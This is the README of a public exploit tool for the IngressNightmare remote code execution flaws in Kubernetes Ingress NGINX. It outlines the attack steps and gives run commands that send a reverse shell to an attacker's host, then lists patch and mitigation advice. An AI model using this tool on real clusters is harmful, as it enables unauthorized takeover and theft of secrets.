## Exploit for Ingress NGINX - IngressNightmare

This project provides an exploit targeting critical **unauthenticated Remote Code Execution (RCE)** vulnerabilities in the Ingress NGINX Controller for Kubernetes, collectively referred to as IngressNightmare. (Research by [Wiz](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities))

In the original research, the Wiz team did not provide a PoC or a functional exploit, so we decided to create our own and share it with the community.

#### Overview

The Ingress NGINX Controller is a widely used component in Kubernetes environments, managing external access to services within clusters. Recent vulnerabilities (CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, CVE-2025-1974) discovered in its admission controller can lead to unauthorized access to all secrets across namespaces and potentially allow complete cluster takeover.

### VIDEO
https://github.com/user-attachments/assets/9e893abf-5c01-4fcb-ad79-7115b429281f

### **Exploit Workflow**

The exploit follows these main steps:

**Generate shared object** (used by the injected `ssl_engine` property):
*Compiles a .so library (evil_engine.so) containing reverse shell payload.*

**Upload the shared object**:
*Sends the compiled shared object to the ingress pod, leveraging request handling (client body buffers). The trick here is to send a different `Content-Length` to the server to keep the connection open and maintain the file descriptor for the file open.*

**Brute-force fd**:
*Iterates over process IDs and file descriptors (/proc/{pid}/fd/{fd}) to identify the correct descriptor referencing the uploaded object.*

Usage

Prerequisites:
Python 3.x
GCC compiler
Python requests module

Run exploit:

`pip3 install -r requirements.txt`

`python3 exploit.py <ingress_url> <admission_webhook_url> [attacker_host:port](attacker_host:port)`

Ex: `python3 xpl.py http://192.168.0.154 https://rke2-ingress-nginx-controller-admission.kube-system 192.168.1.63:443 `

Sometimes the `admission webhook` is in a different namespace. In this case, you need to specify the namespace at the end, such as `kube-system`, `default`, or `ingress-nginx`.

<ingress_url>: Target Ingress URL (public)

<admission_webhook_url>: Admission webhook URL (internal webhook)

[attacker_host:port](attacker_host:port): Your host and port for reverse shell

### Mitigation

Update immediately: Upgrade Ingress NGINX Controller to patched versions (1.12.1 or 1.11.5).

Restrict admission webhook: Limit access to the webhook to only the Kubernetes API Server.

Temporary disablement: Consider temporarily disabling the admission controller component if upgrading isn't immediately possible.

## QuimeraX Intelligence

**QuimeraX Intelligence** is an advanced EASM and Cyber Threat Intelligence platform specializing in identifying critical vulnerabilities in complex systems. The platform proactively monitors, detects, and alerts clients about security threats, ensuring transparency and rapid response to potential risks. Clients receive immediate notifications and comprehensive reports if their systems are found vulnerable, enabling them to take protective action. [learn more](https://hakaisecurity.io/quimera-team/)

## Hakai Security

[Hakai Security](https://hakaisecurity.io/) is a cybersecurity company founded by security professionals, committed to technical excellence. We offer tailored security solutions including advanced penetration testing, realistic Red Team simulations, and secure development practices to proactively protect our clients' assets from evolving cyber threats. [learn more]()

**Disclaimer**

This exploit is provided strictly for educational and research purposes. Unauthorized use of this tool against targets without explicit permission. Hakai Security and QuimeraX hold no responsibility for misuse or damage caused by using this exploit.
